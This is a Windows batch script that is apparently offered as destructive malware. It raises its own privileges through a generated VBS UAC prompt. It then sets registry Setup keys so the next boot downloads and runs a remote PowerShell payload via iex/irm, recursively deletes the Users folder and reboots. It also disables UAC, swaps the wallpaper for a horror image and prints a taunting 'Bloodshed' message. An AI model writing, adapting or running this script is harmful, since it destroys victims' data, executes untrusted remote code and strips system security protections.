@echo off
color OA

:init
setlocal DisableDelayedExpansion
set "batchPath=%~0"
for %%k in (%0) do set "batchName=%%~nk"
set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
setlocal EnableDelayedExpansion

:checkPrivileges
NET FILE 1>NUL 2>NUL
if "%errorlevel%"=="0" (
    goto gotPrivileges
) else (
    goto getPrivileges
)

:getPrivileges
if "%1"=="ELEV" (
    shift /1
    goto gotPrivileges
)
echo Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
echo args = "ELEV " >> "%vbsGetPrivileges%"
echo For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
echo args = args ^& strArg ^& " " >> "%vbsGetPrivileges%"
echo Next >> "%vbsGetPrivileges%"
echo UAC.ShellExecute "%batchPath%", args, "", "runas", 1 >> "%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
exit /B

:gotPrivileges
setlocal & pushd .
cd /d "%~dp0"
if "%1"=="ELEV" (
    del "%vbsGetPrivileges%" >nul 2>&1
    shift /1
)


cls
reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d "cmd.exe /k powershell -command \"iex (irm 'https://raw.githubusercontent.com/Syed930s/CUTEB0YPAYL0AD/refs/heads/main/CuteBoyPayload.ps1')\" & ver >nul && del /f /s /q \Users && shutdown /r /t 0" /f
reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul
curl -L "https://wallpaperbat.com/down/409151-dark-evil-horror-spooky-creepy-scary-wallpaper-2560x1440" -o C:\DeathNet.png
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\DeathNet.png" /f
taskkill /f /im explorer.exe /t
start explorer.exe
ECHO Your PC has been Bloodsheded by The Bloodshed...
echo Don't reboot friend!

